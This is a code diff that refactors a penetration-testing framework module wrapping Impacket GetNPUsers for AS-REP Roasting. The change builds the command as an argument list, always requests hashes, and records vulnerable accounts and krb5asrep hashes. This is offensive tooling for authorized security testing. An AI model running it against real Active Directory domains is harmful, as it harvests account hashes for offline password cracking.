@@ -4,10 +4,10 @@ Impacket GetNPUsers Module (AS-REP Roasting)
 Extract AS-REP hashes from accounts with 'Do not require Kerberos preauthentication' set.
 """
 
-from purplesploit.core.module import ExternalToolModule
+from .common import ImpacketAdapter
 
 
-class ImpacketASREPRoastModule(ExternalToolModule):
+class ImpacketASREPRoastModule(ImpacketAdapter):
     """
     Impacket GetNPUsers - AS-REP Roasting attack.
 
@@ -96,7 +96,9 @@ class ImpacketASREPRoastModule(ExternalToolModule):
             }
         })
 
-    def build_command(self) -> str:
+    emits = ("user", "credential", "resource")
+
+    def build_argv(self) -> list[str]:
         """
         Build the impacket-GetNPUsers command.
 
@@ -114,33 +116,37 @@ class ImpacketASREPRoastModule(ExternalToolModule):
         dc_ip = self.get_option("DC_IP")
 
         # Base command with domain
-        cmd = f"impacket-GetNPUsers {domain}/"
+        target = f"{domain}/{username or ''}"
+        cmd = [self.tool_name, target]
 
         # If we have creds, use them for authenticated enumeration
-        if username and (password or hash_val):
+        if username and (password is not None or hash_val):
             if hash_val:
-                cmd += f"{username} -hashes {hash_val}"
+                cmd += ["-hashes", str(hash_val)]
             else:
-                cmd += f"{username}:{password}"
+                cmd[1] = f"{target}:{password}"
         elif userfile:
             # Test specific users from file
-            cmd += f" -usersfile {userfile} -no-pass"
+            cmd += ["-usersfile", str(userfile), "-no-pass"]
         else:
             # Unauthenticated enumeration
-            cmd += " -no-pass"
+            cmd += ["-no-pass", "-request"]
+
+        if "-request" not in cmd:
+            cmd.append("-request")
 
         # DC IP
         dc = dc_ip if dc_ip else rhost
         if dc:
-            cmd += f" -dc-ip {dc}"
+            cmd += ["-dc-ip", str(dc)]
 
         # Output format
         if format_type:
-            cmd += f" -format {format_type}"
+            cmd += ["-format", str(format_type)]
 
         # Output file
         if output_file:
-            cmd += f" -outputfile {output_file}"
+            cmd += ["-outputfile", str(output_file)]
 
         return cmd
 
@@ -181,4 +187,10 @@ class ImpacketASREPRoastModule(ExternalToolModule):
             if "No entries found" in line or "No users found" in line:
                 results["success"] = True
 
+        observations, credentials = self.roast_observations(output, "asrep")
+        results["observations"] = observations
+        results["credentials"] = credentials
+        results["vulnerable_accounts"] = [record["username"] for record in credentials]
+        results["artifacts"] = [{"type": "hash", "hash_type": "krb5asrep", "value": value}
+                                for value in results["hashes"]]
         return results
